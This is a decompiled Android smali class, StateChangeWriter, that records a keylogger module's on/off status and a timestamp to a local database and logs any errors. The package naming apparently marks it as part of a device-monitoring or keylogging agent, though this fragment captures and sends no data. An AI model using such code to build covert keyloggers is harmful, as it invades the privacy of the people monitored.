.class public Lcom/hp/vd/module/monitor/keylog/StateChangeWriter;
.super Ljava/lang/Object;
.source "StateChangeWriter.java"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field protected final TAG:Ljava/lang/String;

.field protected dao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/KeylogStateChangeData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected status:I


# direct methods
.method public constructor <init>(Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;I)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/KeylogStateChangeData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/agent/log/IWriter;",
            "I)V"
        }
    .end annotation

    .line 19
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const-string v0, "StateChangeWriter"

    .line 12
    iput-object v0, p0, Lcom/hp/vd/module/monitor/keylog/StateChangeWriter;->TAG:Ljava/lang/String;

    .line 20
    iput-object p1, p0, Lcom/hp/vd/module/monitor/keylog/StateChangeWriter;->dao:Lcom/j256/ormlite/dao/Dao;

    .line 21
    iput-object p2, p0, Lcom/hp/vd/module/monitor/keylog/StateChangeWriter;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 22
    iput p3, p0, Lcom/hp/vd/module/monitor/keylog/StateChangeWriter;->status:I

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    .line 29
    :try_start_0
    new-instance v0, Lcom/hp/vd/data/KeylogStateChangeData;

    invoke-direct {v0}, Lcom/hp/vd/data/KeylogStateChangeData;-><init>()V

    .line 31
    iget v1, p0, Lcom/hp/vd/module/monitor/keylog/StateChangeWriter;->status:I

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/KeylogStateChangeData;->status:Ljava/lang/Integer;

    .line 32
    new-instance v1, Ljava/util/Date;

    invoke-direct {v1}, Ljava/util/Date;-><init>()V

    iput-object v1, v0, Lcom/hp/vd/data/KeylogStateChangeData;->createdAt:Ljava/util/Date;

    .line 34
    iget-object v1, p0, Lcom/hp/vd/module/monitor/keylog/StateChangeWriter;->dao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v1, v0}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 37
    iget-object v1, p0, Lcom/hp/vd/module/monitor/keylog/StateChangeWriter;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "StateChangeWriter"

    const-string v3, "run(): exception caught while persisting KeylogStateChangeData"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :goto_0
    return-void
.end method
